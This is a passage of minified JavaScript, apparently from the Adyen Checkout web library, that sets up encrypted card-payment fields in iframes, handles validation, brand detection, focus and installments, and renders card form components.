Th(e){if(this.state.iframeConfigCount+=1,this.state.isConfigured){var t={additionalIframeConfigured:!0,fieldType:e.fieldType,type:this.state.type};this.callbacks.onAdditionalSFConfig(t)}else if(this.state.iframeConfigCount===this.state.originalNumIframes)return this.isConfigured(),!0;return!1}function Ph(){var e,t={iframesConfigured:this.state.isConfigured=!0,type:this.state.type,rootNode:this.props.rootNode};if(this.callbacks.onConfigSuccess(t),1===this.state.numIframes&&this.config.isCreditCardType){if("card"===this.state.type)return void Zp("ERROR: Payment method with a single secured field - but 'type' has not been set to a specific card brand");var n=vh(this.state.type);n&&(null!==(e=n.cvcPolicy)&&void 0!==e?e:Np)!==Np&&this.assessFormValidity()}}function Ih(){var e=function(e){for(var t=Object.keys(e),n=0,r=t.length;n<r;n+=1)if(!e[t[n]].isValid)return!1;return!0}(this.state.securedFields),t=e!==this.state.allValid;if((this.state.allValid=e)||t){var n={allValid:e,type:this.state.type,rootNode:this.props.rootNode};this.callbacks.onAllValid(n)}}function Fh(e){var t=e.binValue,n=e.encryptedBin,r=e.uuid,i={binValue:t,type:this.state.type};n&&(i.encryptedBin=n,i.uuid=r),this.callbacks.onBinValue(i)}function Lh(e){if(Object.prototype.hasOwnProperty.call(this.state.securedFields,Mp)){var t=ml(ml({txVariant:this.state.type},e),{fieldType:Mp,numKey:this.state.securedFields.encryptedCardNumber.numKey});ah(t,this.getIframeContentWin(Mp),this.config.loadingContext)}}function Oh(e){var t,n="card"===this.state.type;if(!e||!Object.keys(e).length)return n&&this.sendBrandToCardSF({brand:"reset"}),void("card"===this.state.type&&Object.prototype.hasOwnProperty.call(this.state.securedFields,Bp)&&(this.state.securedFields.encryptedExpiryDate.datePolicy=jp));var r=e.supportedBrands[0],i=r.brand,a=!0===r.showExpiryDate?jp:Up,o={brand:i,cvcPolicy:r.cvcPolicy,datePolicy:a,cvcText:"Security code",showSocialSecurityNumber:null!==(t=r.showSocialSecurityNumber)&&void 0!==t&&t,fieldType:Mp};this.processBrand(o),n&&this.sendBrandToCardSF({brand:i,enableLuhnCheck:!1!==e.supportedBrands[0].enableLuhnCheck}),Object.prototype.hasOwnProperty.call(this.state.securedFields,Pp)&&(this.state.securedFields.encryptedSecurityCode.cvcPolicy=r.cvcPolicy),Object.prototype.hasOwnProperty.call(this.state.securedFields,Bp)&&(this.state.securedFields.encryptedExpiryDate.datePolicy=a),this.assessFormValidity()}/(android)/i.test(navigator.userAgent);var Nh=function(){var e=navigator.userAgent,t=e.indexOf("MSIE ");if(0<t)return parseInt(e.substring(t+5,e.indexOf(".",t)),10);if(0<e.indexOf("Trident/")){var n=e.indexOf("rv:");return parseInt(e.substring(n+3,e.indexOf(".",n)),10)}var r=e.indexOf("Edge/");return 0<r&&parseInt(e.substring(r+5,e.indexOf(".",r)),10)}(),Dh=/iphone|ipod|ipad/i.test(navigator.userAgent),Rh=/(firefox)/i.test(navigator.userAgent),jh=(/(safari)/i.test(navigator.userAgent)&&/(chrome)/i.test(navigator.userAgent),{touchendListener:function(e){var t,n=e.target;if(n instanceof HTMLInputElement||HTMLTextAreaElement&&n instanceof HTMLTextAreaElement){var r=n.value,i="selectionStart"in(t=n)?t.selectionStart:0,a=!1;i===r.length&&(i-=1,a=!0),n.value=r,n.setSelectionRange&&(n.focus(),n.setSelectionRange(i,i),a&&(i+=1,setTimeout((function(){n.setSelectionRange(i,i)}),0)))}else if(this.config.keypadFix){var o=this.props.rootNode,s=document.createElement("input");s.style.width="1px",s.style.height="1px",s.style.opacity="0",s.style.fontSize="18px",o.appendChild(s),s.focus(),o.removeChild(s)}this.destroyTouchendListener(),this.state.registerFieldForIos=!1,this.postMessageToAllIframes({fieldType:"additionalField",click:!0})},handleAdditionalFields:function(){if(Dh){var e=ch(document,"body");e.style.cursor="pointer",dh(e,"touchend",this.touchendListener),this.state.registerFieldForIos=!0}},destroyTouchendListener:function(){if(Dh){var e=ch(document,"body");e.style.cursor="auto",ph(e,"touchend",this.touchendListener)}}}),Uh=function(e,t){return function(e,t){void 0===t&&(t=!0);var n=Array.prototype.slice.call(lh(document,"*[data-cse], a[href], area[href], input:not([disabled]), select:not([disabled]), textarea:not([disabled]), button:not([disabled]), object, embed, *[tabindex], *[contenteditable]")),r=[];n.forEach((function(e){var t=e.getAttribute("tabindex"),n=!t||0<=parseInt(t,10),i=e.getBoundingClientRect(),a=0<i.width&&0<i.height;n&&a&&r.push(e)}));var i=function(t,n){for(var r=0;r<t.length;r+=1)if((i=t[r])===e||e.contains(i))return r;var i;return-1}(r);return r[i+(t?-1:1)]}(ch(t,"[data-cse="+e+"]"))},$h=function(e){var t,n;switch(this.state.type){case"ach":"encryptedBankLocationId"===e&&(n="encryptedBankAccountNumber"),t={fieldToFocus:n,additionalField:void 0};break;case"giftcard":t=function(e,t){var n,r;switch(e){case Mp:n=Uh(Mp,t);break;case Pp:r=Mp}return{fieldToFocus:r,additionalField:n}}(e,this.props.rootNode);break;default:t=this.state.isKCP?function(e,t,n){var r,i;switch(e){case Mp:r=Uh(Mp,t);break;case Bp:case Ep:i=Mp;break;case Tp:i=Ep;break;case Pp:i=n?Tp:Bp;break;case Ip:case"encryptedPin":r=Uh(e,t)}return{fieldToFocus:i,additionalField:r}}(e,this.props.rootNode,this.state.hasSeparateDateFields):function(e,t,n,r){var i,a;switch(e){case Mp:i=Uh(Mp,t);break;case Bp:case Ep:a=Mp;break;case Tp:a=Ep;break;case Pp:1===r?i=Uh(Pp,t):a=n?Tp:Bp}return{fieldToFocus:a,additionalField:i}}(e,this.props.rootNode,this.state.hasSeparateDateFields,this.state.numIframes)}var r,i=t.fieldToFocus,a=t.additionalField;i?this.setFocusOnFrame(i,!1):a&&(r=a)&&(r.focus(),r.blur(),r.focus())},zh=function(e){(Rh||Nh&&Nh<=11)&&this.handleShiftTab(e)},Hh=function(e){void 0===e&&(e="You cannot use secured fields"),th(e+" - they are not yet configured. Use the 'onConfigSuccess' callback to know when this has happened.")},Vh=function(e){function t(t){var n=e.call(this,t)||this;return n.state={type:n.props.type,brand:"card"!==n.props.type?{brand:n.props.type,cvcPolicy:"required"}:{brand:null,cvcPolicy:"required"},allValid:void 0,numIframes:0,originalNumIframes:0,iframeCount:0,iframeConfigCount:0,isConfigured:!1,hasSeparateDateFields:!1,currentFocusObject:null,registerFieldForIos:!1,securedFields:{},isKCP:!1},n.configHandler=nh,n.callbacksHandler=ih,n.handleIframeConfigFeedback=Th,n.isConfigured=Ph,n.assessFormValidity=Ih,n.processBrand=oh,n.handleValidation=fh,n.handleEncryption=Ah,n.createSecuredFields=_h,n.createNonCardSecuredFields=wh,n.createCardSecuredFields=Ch,n.setupSecuredField=xh,n.postMessageToAllIframes=kh,n.setFocusOnFrame=Sh,n.handleFocus=Eh,n.handleAdditionalFields=jh.handleAdditionalFields,n.touchendListener=jh.touchendListener.bind(n),n.destroyTouchendListener=jh.destroyTouchendListener,n.handleSFShiftTab=zh,n.handleShiftTab=$h,n.destroySecuredFields=Mh,n.processAutoComplete=Bh,n.handleBinValue=Fh,n.brandsFromBinLookup=Oh,n.sendBrandToCardSF=Lh,n.init(),n}return Al(t,e),t.prototype.init=function(){this.configHandler(),this.callbacksHandler(this.props.callbacks);var e=this.createSecuredFields();this.state.numIframes=this.state.originalNumIframes=e,this.state.isKCP=!!this.props.isKCP},t.prototype.createReturnObject=function(){var e=this;return{updateStyles:function(t){e.state.isConfigured?e.postMessageToAllIframes({styleObject:t}):th("You cannot update the secured fields styling - they are not yet configured. Use the 'onConfigSuccess' callback to know when this has happened.")},setFocusOnFrame:function(t){e.state.isConfigured?e.setFocusOnFrame(t):Hh("You cannot set focus on any secured field")},isValidated:function(t,n){if(e.state.isConfigured){if(Object.prototype.hasOwnProperty.call(e.state.securedFields,t)){e.state.securedFields[t].hasError=!0,""===e.state.securedFields[t].errorType&&(e.state.securedFields[t].errorType="isValidated");var r={txVariant:e.state.type,fieldType:t,externalValidation:!0,code:n,numKey:e.state.securedFields[t].numKey};ah(r,e.getIframeContentWin(t),e.config.loadingContext)}}else Hh("You cannot set validated on any secured field")},hasUnsupportedCard:function(t,n){if(e.state.isConfigured){if(Object.prototype.hasOwnProperty.call(e.state.securedFields,t)){e.state.securedFields[t].hasError=!!n,e.state.securedFields[t].errorType=n;var r={txVariant:e.state.type,fieldType:t,unsupportedCard:!!n,code:n,numKey:e.state.securedFields[t].numKey};ah(r,e.getIframeContentWin(t),e.config.loadingContext)}}else Hh("You cannot set hasUnsupportedCard on any secured field")},destroy:function(){e.state.isConfigured?e.destroySecuredFields():Hh("You cannot destroy secured fields")},brandsFromBinLookup:function(t){if(!e.config.isCreditCardType)return null;e.state.isConfigured?e.brandsFromBinLookup(t):Hh("You cannot set pass brands to secured fields")},addSecuredField:function(t){var n=ch(e.props.rootNode,'[data-cse="'+t+'"]');n&&(e.state.numIframes+=1,e.setupSecuredField(n))},removeSecuredField:function(t){if(e.state.securedFields[t]){e.state.securedFields[t].destroy(),delete e.state.securedFields[t],e.state.numIframes-=1;var n={additionalIframeRemoved:!0,fieldType:t,type:e.state.type};e.callbacks.onAdditionalSFRemoved(n)}},setKCPStatus:function(t){e.state.isKCP=t}}},t.prototype.getIframeContentWin=function(e){var t;return(null===(t=this.state.securedFields[e])||void 0===t?void 0:t.iframeContentWindow)||null},t}((function(e){this.props=e,this.state={},this.config={},this.callbacks={}})),Qh={handleFocus:function(e){e.fieldType===Pp&&(this.numCharsInCVC=e.numChars),this.props.onFocus(e)},handleOnAllValid:function(e){var t=this;return!this.state.hasUnsupportedCard&&(this.setState({isSfpValid:e.allValid},(function(){t.props.onChange(t.state),t.props.onAllValid(e)})),!0)},handleOnAutoComplete:function(e){var t=this;this.setState({autoCompleteName:e.value},(function(){t.props.onChange(t.state),t.setState({autoCompleteName:null})})),this.props.onAutoComplete(e)},handleOnFieldValid:function(e){var t=this;return!(this.state.hasUnsupportedCard&&e.fieldType===Mp||(this.setState((function(t){var n,r,i,a;return{data:ml(ml({},t.data),(n={},n[e.encryptedFieldName]=e.blob,n)),valid:ml(ml({},t.valid),(r={},r[e.encryptedFieldName]=e.valid,r)),errors:ml(ml({},t.errors),(i={},i[e.fieldType]=null!==(a=t.errors[e.fieldType])&&void 0!==a&&a,i))}}),(function(){t.props.onChange(t.state),t.props.onFieldValid(e)})),0))},handleOnLoad:function(e){var t=this;this.props.onLoad(e),this.originKeyErrorTimeout=setTimeout((function(){"ready"!==t.state.status&&(t.setState({status:"originKeyError"}),t.props.onError({error:"originKeyError",fieldType:"defaultError"}))}),this.originKeyTimeoutMS)},handleOnConfigSuccess:function(e){var t=this;clearTimeout(this.originKeyErrorTimeout),this.setState({status:"ready"},(function(){t.props.onConfigSuccess(e)}))},handleOnBrand:function(e){var t=this;this.setState((function(n){var r,i,a=(e.cvcPolicy!==Dp&&e.cvcPolicy!==Rp||0!==t.numCharsInCVC)&&n.errors.encryptedSecurityCode;return{brand:e.brand,cvcPolicy:null!==(i=e.cvcPolicy)&&void 0!==i?i:Np,showSocialSecurityNumber:e.showSocialSecurityNumber,errors:ml(ml({},n.errors),Xp(a)&&(r={},r.encryptedSecurityCode=a,r)),hideDateForBrand:e.datePolicy===Up}}),(function(){var n,r;t.props.onChange(t.state);var i=null!==(r=null===(n=t.props.brandsConfiguration[e.brand])||void 0===n?void 0:n.icon)&&void 0!==r?r:Vp(e.brand,t.props.loadingContext);t.props.onBrand(ml(ml({},e),{brandImageUrl:i}))}))},handleOnError:function(e,t){var n=this;void 0===t&&(t=null);var r=e.error;this.setState((function(n){var i;return{errors:ml(ml({},n.errors),(i={},i[e.fieldType]=r||!1,i)),hasUnsupportedCard:null!==t&&t}}),(function(){n.props.onChange(n.state)})),e.errorI18n=this.props.i18n.get(r);var i=yh(r);return e.errorText=""!==i?i:"error was cleared",this.props.onError(e),!0},handleOnNoDataRequired:function(){var e=this;this.setState({status:"ready"},(function(){return e.props.onChange({isSfpValid:!0})}))}},Gh={type:"card",keypadFix:!0,rootNode:null,loadingContext:null,groupTypes:[],allowedDOMAccess:!1,showWarnings:!1,autoFocus:!0,trimTrailingSeparator:!0,onChange:function(){},onLoad:function(){},onConfigSuccess:function(){},onAllValid:function(){},onFieldValid:function(){},onBrand:function(){},onError:function(){},onBinValue:function(){},onFocus:function(){},onAutoComplete:function(){},placeholders:{},styles:{}},Wh=function(e){function t(t){var n=e.call(this,t)||this;n.setRootNode=function(e){n.rootNode=e};var r={status:"loading",brand:t.type,errors:{},valid:{},data:{},cvcPolicy:Np,isSfpValid:!1,hasKoreanFields:n.props.hasKoreanFields};return n.state=r,n.originKeyErrorTimeout=null,n.originKeyTimeoutMS=15e3,n.numCharsInCVC=0,n.handleOnLoad=Qh.handleOnLoad.bind(n),n.handleOnConfigSuccess=Qh.handleOnConfigSuccess.bind(n),n.handleOnFieldValid=Qh.handleOnFieldValid.bind(n),n.handleOnAllValid=Qh.handleOnAllValid.bind(n),n.handleOnBrand=Qh.handleOnBrand.bind(n),n.handleFocus=Qh.handleFocus.bind(n),n.handleOnError=Qh.handleOnError.bind(n),n.handleOnNoDataRequired=Qh.handleOnNoDataRequired.bind(n),n.handleOnAutoComplete=Qh.handleOnAutoComplete.bind(n),n.processBinLookupResponse=n.processBinLookupResponse.bind(n),n.setFocusOn=n.setFocusOn.bind(n),n.updateStyles=n.updateStyles.bind(n),n.handleUnsupportedCard=n.handleUnsupportedCard.bind(n),n.showValidation=n.showValidation.bind(n),n.destroy=n.destroy.bind(n),n}return Al(t,e),t.prototype.componentDidMount=function(){this.props.rootNode&&this.setRootNode(this.props.rootNode);var e,t=(e=this.rootNode)?Array.prototype.slice.call(e.querySelectorAll('[data-cse*="encrypted"]')).map((function(e){return e.getAttribute("data-cse")})):[],n=t.reduce(Hp,{});this.setState({valid:n}),this.numDateFields=t.filter((function(e){return e.match(/Expiry/)})).length,t.length?(this.destroy(),this.initializeCSF(this.rootNode)):this.handleOnNoDataRequired()},t.prototype.componentDidUpdate=function(){this.checkForKCPFields()},t.prototype.componentWillUnmount=function(){this.csf=null},t.prototype.initializeCSF=function(e){var t=this.props.loadingContext,n={rootNode:e,type:this.props.type,clientKey:this.props.clientKey,cardGroupTypes:this.props.groupTypes,allowedDOMAccess:this.props.allowedDOMAccess,autoFocus:this.props.autoFocus,trimTrailingSeparator:this.props.trimTrailingSeparator,loadingContext:t,keypadFix:this.props.keypadFix,showWarnings:this.props.showWarnings,iframeUIConfig:{sfStyles:this.props.styles},i18n:this.props.i18n,callbacks:{onLoad:this.handleOnLoad,onConfigSuccess:this.handleOnConfigSuccess,onFieldValid:this.handleOnFieldValid,onAllValid:this.handleOnAllValid,onBrand:this.handleOnBrand,onError:this.handleOnError,onFocus:this.handleFocus,onBinValue:this.props.onBinValue,onAutoComplete:this.handleOnAutoComplete,onAdditionalSFConfig:this.props.onAdditionalSFConfig,onAdditionalSFRemoved:this.props.onAdditionalSFRemoved},isKCP:this.state.hasKoreanFields,legacyInputMode:this.props.legacyInputMode,minimumExpiryDate:this.props.minimumExpiryDate};this.csf=function(e){if(!e)throw new Error("No securedFields configuration object defined");var t,n,r,i,a=ml({},e),o=(void 0===(t=a.type)&&(t="card"),"card"===t||"scheme"===t);if(a.type=o?"card":a.type,!Object.prototype.hasOwnProperty.call(a,"rootNode"))return Zp('ERROR: SecuredFields configuration object is missing a "rootNode" property'),null;if(!Yp(n=a.clientKey)||("number"==typeof(i=n)||Jp(i)&&"[object Number]"===Kp.call(i))&&(0===n||Number.isNaN(n))||(qp(n)||"string"==typeof(r=n)||Jp(r)&&"[object String]"===Kp.call(r))&&0===n.length||Jp(n)&&0===Object.keys(n).length)return th('WARNING: AdyenCheckout configuration object is missing a "clientKey" property.'),null;var s,l,c=("object"==_typeof2(s=a.rootNode)&&(l=s),"string"!=typeof s||(l=ch(document,s))?l:null);return c?(a.rootNode=c,new Vh(a).createReturnObject()):(window.console&&window.console.error&&window.console.error("ERROR: SecuredFields cannot find a valid rootNode element for",a.type),null)}(n)},t.prototype.checkForKCPFields=function(){var e=this,t=!1;this.props.koreanAuthenticationRequired&&(t=this.issuingCountryCode?"kr"===this.issuingCountryCode:"kr"===this.props.countryCode),this.state.hasKoreanFields&&!t&&(this.setState((function(e){var t,n,r;return{data:ml(ml({},e.data),(t={},t.encryptedPassword=void 0,t)),valid:ml(ml({},e.valid),(n={},n.encryptedPassword=!1,n)),errors:ml(ml({},e.errors),(r={},r.encryptedPassword=!1,r)),hasKoreanFields:!1}}),(function(){e.props.onChange(e.state)})),this.csf.removeSecuredField(Ip),this.csf.setKCPStatus(!1)),!this.state.hasKoreanFields&&t&&(this.setState((function(e){var t;return{valid:ml(ml({},e.valid),(t={},t.encryptedPassword=!1,t)),hasKoreanFields:!0,isSfpValid:!1}}),(function(){e.props.onChange(e.state)})),this.csf.addSecuredField(Ip),this.csf.setKCPStatus(!0))},t.prototype.getChildContext=function(){return{i18n:this.props.i18n}},t.prototype.handleUnsupportedCard=function(e){var t=!!e.error;return e.rootNode=this.rootNode,this.handleOnError(e,t),this.csf&&this.csf.hasUnsupportedCard(Mp,e.error),t},t.prototype.setFocusOn=function(e){this.csf&&this.csf.setFocusOnFrame(e)},t.prototype.updateStyles=function(e){this.csf&&this.csf.updateStyles(e)},t.prototype.destroy=function(){this.csf&&this.csf.destroy()},t.prototype.showValidation=function(){var e,t,n=this,r=this.numDateFields,i=this.state;Object.keys(i.valid).reduce((e=r,t=i,function(n,r){var i,a,o,s,l=!0!==t.valid[r]?1!==e||r!==Ep&&r!==Tp?r:Bp:null;return o=(i=l)===Pp,s=!(a=t).errors.encryptedSecurityCode,(l=(a.cvcPolicy===Dp||a.cvcPolicy===Rp)&&s&&o?null:i)&&!n.includes(l)&&n.push(l),n}),[]).forEach((function(e){var t,r=(t=e,{rootNode:n.rootNode,fieldType:t,error:dc(i,"errors."+t)||zp,type:"card"});n.handleOnError(r,i.hasUnsupportedCard),n.csf&&n.csf.isValidated&&n.csf.isValidated(e,r.error)}))},t.prototype.mapErrorsToValidationRuleResult=function(){var e=this;return Object.keys(this.state.errors).reduce((function(t,n){return e.state.errors[n]?t[n]={isValid:!1,errorMessage:yh(e.state.errors[n])}:t[n]=null,t}),{})},t.prototype.processBinLookupResponse=function(e,t){var n,r=this;this.state.hasUnsupportedCard&&(this.setState((function(e){var t;return{errors:ml(ml({},e.errors),(t={},t.encryptedCardNumber=!1,t)),hasUnsupportedCard:!1}})),this.csf&&e)&&this.handleUnsupportedCard({type:"card",fieldType:"encryptedCardNumber",error:""}),this.issuingCountryCode=null===(n=null==e?void 0:e.issuingCountryCode)||void 0===n?void 0:n.toLowerCase(),(null==t?void 0:t.brand)&&this.setState(t,(function(){r.props.onChange(r.state)})),this.csf&&this.csf.brandsFromBinLookup(e)},t.prototype.render=function(e,t){return e.render({setRootNode:this.setRootNode,setFocusOn:this.setFocusOn},t)},t.defaultProps=Gh,t}(Gl),Kh={base:{caretColor:"#0066FF"}},qh={"card-input__wrapper":"CardInput-module_card-input__wrapper__2tAzu","card-input__icon":"CardInput-module_card-input__icon__2Iaf5","card-input__form":"CardInput-module_card-input__form__2Ij_n","card-input__spinner":"CardInput-module_card-input__spinner__1wHzq","card-input__spinner--active":"CardInput-module_card-input__spinner--active__1Dzoe","card-input__form--loading":"CardInput-module_card-input__form--loading__3zh3Y","adyen-checkout__input":"CardInput-module_adyen-checkout__input__3Jmld","adyen-checkout__card__cvc__input--hidden":"CardInput-module_adyen-checkout__card__cvc__input--hidden__1Z1lp","adyen-checkout__card__exp-date__input--hidden":"CardInput-module_adyen-checkout__card__exp-date__input--hidden__3850Y","adyen-checkout__card__exp-cvc__exp-date__input--hidden":"CardInput-module_adyen-checkout__card__exp-cvc__exp-date__input--hidden__3wxr3","revolving-plan-installments__disabled":"CardInput-module_revolving-plan-installments__disabled__2yP53"},Xh=function(e){var t,n,r=e.children,i=e.status,a=Cc("adyen-checkout__loading-input__form","LoadingWrapper-module_loading-input__form__1jpVs",((t={})["LoadingWrapper-module_loading-input__form--loading__3LDWz"]="loading"===i,t));return Hl("div",{style:{position:"relative"}},Hl("div",{className:Cc(((n={})["LoadingWrapper-module_loading-input__spinner__3eCyK"]=!0,n["LoadingWrapper-module_loading-input__spinner--active__3UDtX"]="loading"===i,n))},Hl(xc,null)),Hl("div",{className:a},r))};function Yh(e){var t=e.frontCVC,n=void 0!==t&&t;return Hl("div",{className:Cc({"adyen-checkout__card__cvc__hint__wrapper":!0,"adyen-checkout__field__cvc--front-hint":!!n,"adyen-checkout__field__cvc--back-hint":!n})},Hl("svg",{className:"adyen-checkout__card__cvc__hint adyen-checkout__card__cvc__hint--front",width:"27",height:"18",viewBox:"0 0 27 18",fill:"none",xmlns:"http://www.w3.org/2000/svg"},Hl("path",{d:"M0 3C0 1.34315 1.34315 0 3 0H24C25.6569 0 27 1.34315 27 3V15C27 16.6569 25.6569 18 24 18H3C1.34315 18 0 16.6569 0 15V3Z",fill:"#E6E9EB"}),Hl("rect",{x:"4",y:"12",width:"19",height:"2",fill:"#B9C4C9"}),Hl("rect",{x:"4",y:"4",width:"4",height:"4",rx:"1",fill:"white"}),Hl("rect",{className:"adyen-checkout__card__cvc__hint__location",x:"16.5",y:"4.5",width:"7",height:"5",rx:"2.5",stroke:"#D10244"})),Hl("svg",{className:"adyen-checkout__card__cvc__hint adyen-checkout__card__cvc__hint--back",width:"27",height:"18",viewBox:"0 0 27 18",fill:"none",xmlns:"http://www.w3.org/2000/svg"},Hl("path",{d:"M27 4.00001V3.37501C27 2.4799 26.6444 1.62146 26.0115 0.988518C25.3786 0.355581 24.5201 0 23.625 0H3.375C2.47989 0 1.62145 0.355581 0.988514 0.988518C0.355579 1.62146 0 2.4799 0 3.37501V4.00001H27Z",fill:"#E6E9EB"}),Hl("path",{d:"M0 6.99994V14.6666C0 15.5507 0.355579 16.3985 0.988514 17.0237C1.62145 17.6488 2.47989 18 3.375 18H23.625C24.5201 18 25.3786 17.6488 26.0115 17.0237C26.6444 16.3985 27 15.5507 27 14.6666V6.99994H0Z",fill:"#E6E9EB"}),Hl("rect",{y:"4.00012",width:"27",height:"3.00001",fill:"#687282"}),Hl("path",{d:"M4 11C4 10.4477 4.44772 10 5 10H21C22.1046 10 23 10.8954 23 12C23 13.1046 22.1046 14 21 14H5C4.44771 14 4 13.5523 4 13V11Z",fill:"white"}),Hl("rect",{className:"adyen-checkout__card__cvc__hint__location",x:"16.5",y:"9.5",width:"7",height:"5",rx:"2.5",stroke:"#D10244"})))}function Jh(e){var t,n,r=e.label,i=e.onFocusField,a=void 0===i?function(){}:i,o=e.error,s=void 0===o?"":o,l=e.className,c=void 0===l?"":l,u=e.classNameModifiers,d=void 0===u?[]:u,p=e.focused,h=e.filled,f=e.isValid,A=e.frontCVC,m=void 0!==A&&A,v=e.cvcPolicy,g=void 0===v?Np:v,y=Xc().i18n,b=Cc(c,((t={"adyen-checkout__field__cvc":!0})[qh["adyen-checkout__card__cvc__input--hidden"]]=g===Rp,t["adyen-checkout__field__cvc--optional"]=g===Dp,t)),_=Cc(((n={"adyen-checkout__input":!0,"adyen-checkout__input--small":!0,"adyen-checkout__card__cvc__input":!0,"adyen-checkout__input--error":s,"adyen-checkout__input--focus":p,"adyen-checkout__input--valid":f})[qh["adyen-checkout__input"]]=!0,n)),w=g!==Dp?r:y.get("creditCard.cvcField.title.optional");return Hl(mu,{label:w,focused:p,filled:h,classNameModifiers:bl(bl([],d),["securityCode"]),onFocusField:function(){return a("encryptedSecurityCode")},className:b,errorMessage:s&&y.get(s),isValid:f,dir:"ltr"},Hl("span",{className:_,"data-cse":"encryptedSecurityCode"}),Hl(Yh,{frontCVC:m}))}function Zh(e){var t=e.brand,n=e.hasCVC,r=e.onFocusField,i=e.errors,a=e.valid,o=vl(e,["brand","hasCVC","onFocusField","errors","valid"]),s=Xc().i18n;return Hl("div",{className:"adyen-checkout__card__form adyen-checkout__card__form--oneClick","aria-label":s.get("creditCard.storedCard.description.ariaLabel").replace("%@",o.lastFour)+" "+s.get("creditCard.expiryDateField.title")+" "+o.expiryMonth+"/"+o.expiryYear},Hl("div",{className:"adyen-checkout__card__exp-cvc adyen-checkout__field-wrapper"},Hl(mu,{label:s.get("creditCard.expiryDateField.title"),className:"adyen-checkout__field--50",classNameModifiers:["storedCard"],disabled:!0},Hl("div",{className:"adyen-checkout__input adyen-checkout__input--disabled adyen-checkout__card__exp-date__input--oneclick",dir:"ltr"},o.expiryMonth," / ",o.expiryYear)),n&&Hl(Jh,{cvcPolicy:o.cvcPolicy,error:i.encryptedSecurityCode,focused:"encryptedSecurityCode"===o.focusedElement,filled:!!a.encryptedSecurityCode||!!i.encryptedSecurityCode,isValid:!!a.encryptedSecurityCode,label:s.get("creditCard.cvcField.title"),onFocusField:r,className:"adyen-checkout__field--50",classNameModifiers:["storedCard"],frontCVC:"amex"===t})))}function ef(e){var t,n,r=Xc().i18n,i=e.amount,a=e.brand,o=e.onChange,s=e.type,l=e.installmentOptions[a]||e.installmentOptions.card,c=Fc((null==l?void 0:l.preselectedValue)||(null==l?void 0:l.values[0])),u=c[0],d=c[1],p=Fc("onetime"),h=p[0],f=p[1],A=null===(t=null==l?void 0:l.plans)||void 0===t?void 0:t.includes("revolving"),m=function(e){var t=e.target.value;d(Number(t))},v=function(e){var t,n,a;return n="amount"===s?(t="installmentOption",{count:e,values:{times:e,partialValue:(a=e,r.amount(i.value/a,i.currency))}}):(t="installmentOptionMonths",{count:e,values:{times:e}}),{id:e,name:i.value?r.get(t,n):""+e}};return Oc((function(){var e,t=(null===(e=null==l?void 0:l.values)||void 0===e?void 0:e.includes(u))?u:null==l?void 0:l.values[0];d(t)}),[a]),Oc((function(){var e=ml(ml({value:u},A&&"revolving"===h&&{plan:h,value:1}),A&&"onetime"===h&&{value:1});o(l?e:{value:null})}),[u,l,h]),l?0===i.value?null:Hl("div",{className:"adyen-checkout__installments"},A?Hl(fu,{classNameModifiers:["revolving-plan"],label:""},Hl(Su,{items:[{id:"onetime",name:"installments.oneTime"},{id:"installments",name:"installments.installments"},{id:"revolving",name:"installments.revolving"}],i18n:r,onChange:function(e){var t=e.currentTarget.getAttribute("value");f(t)},value:h}),Hl(mu,{className:"installments"!==h?""+qh["revolving-plan-installments__disabled"]:""+qh["revolving-plan-installments"],classNameModifiers:["revolving-plan-installments"]},Lu("select",{filterable:!1,items:l.values.map(v),selected:u,onChange:m,name:"installments"}))):Hl(mu,{label:r.get("installments"),classNameModifiers:["installments"]},Lu("select",{filterable:!1,items:l.values.map(v),selected:u,onChange:m,name:"installments",readonly:1===(null===(n=null==l?void 0:l.values)||void 0===n?void 0:n.length)}))):null}var tf=function(e,t){return gc({type:"card"===e?"nocard":e||"nocard",extension:"svg",loadingContext:t})(e)};function nf(e){var t,n,r=e.brand,i=e.brandsConfiguration,a=void 0===i?{}:i,o=Xc().loadingContext,s="card"===r?"nocard":r,l=null!==(n=null===(t=a[r])||void 0===t?void 0:t.icon)&&void 0!==n?n:tf(s,o);return Hl("img",{className:qh["card-input__icon"]+" adyen-checkout__card__cardNumber__brandIcon",onError:function(e){e.target.style.cssText="display: none"},alt:r,src:l})}var rf=function(e){var t,n,r=e.brand,i=e.onClick,a=e.dataValue,o=e.notSelected,s=e.brandsConfiguration,l=void 0===s?{}:s,c=Xc().loadingContext,u="card"===r?"nocard":r,d=null!==(n=null===(t=l[r])||void 0===t?void 0:t.icon)&&void 0!==n?n:tf(u,c);return Hl("img",{className:qh["card-input__icon"]+" "+(o?"adyen-checkout__card__cardNumber__brandIcon--not-selected":"")+" adyen-checkout__card__cardNumber__brandIcon",onError:function(e){e.target.style.cssText="display: none"},alt:r,src:d,onClick:i,"data-value":a})};function af(e){var t,n=Xc().i18n,r=e.error,i=void 0===r?"":r,a=e.isValid,o=void 0!==a&&a,s=e.onFocusField,l=void 0===s?function(){}:s,c=e.dualBrandingElements,u=e.dualBrandingChangeHandler,d=e.dualBrandingSelected;return Hl(mu,{label:e.label,focused:e.focused,filled:e.filled,classNameModifiers:["cardNumber"],onFocusField:function(){return l("encryptedCardNumber")},errorMessage:i&&n.get(i),isValid:o,dualBrandingElements:c,dir:"ltr"},Hl("span",{"data-cse":"encryptedCardNumber",className:Cc((t={"adyen-checkout__input":!0,"adyen-checkout__input--large":!0,"adyen-checkout__card__cardNumber__input":!0},t[qh["adyen-checkout__input"]]=!0,t["adyen-checkout__input--error"]=i,t["adyen-checkout__input--focus"]=e.focused,t["adyen-checkout__input--valid"]=o,t["adyen-checkout__card__cardNumber__input--noBrand"]=!e.showBrandIcon,t))},e.showBrandIcon&&!c&&Hl(nf,{brandsConfiguration:e.brandsConfiguration,brand:e.brand})),c&&!i&&Hl("div",{className:Cc(["adyen-checkout__card__dual-branding__buttons",{"adyen-checkout__card__dual-branding__buttons--active":o}])},c.map((function(t){return Hl(rf,{key:t.id,brand:t.id,brandsConfiguration:e.brandsConfiguration,onClick:u,dataValue:t.id,notSelected:""!==d&&d!==t.id})}))))}function of(e){var t,n=e.label,r=e.focused,i=e.filled,a=e.onFocusField,o=e.className,s=void 0===o?"":o,l=e.error,c=void 0===l?"":l,u=e.isValid,d=void 0!==u&&u,p=e.hideDateForBrand,h=void 0!==p&&p,f=Xc().i18n,A=Cc(s,((t={})[qh["adyen-checkout__card__exp-date__input--hidden"]]=h,t));return Hl(mu,{label:n,classNameModifiers:["expiryDate"],className:A,focused:r,filled:i,onFocusField:function(){return 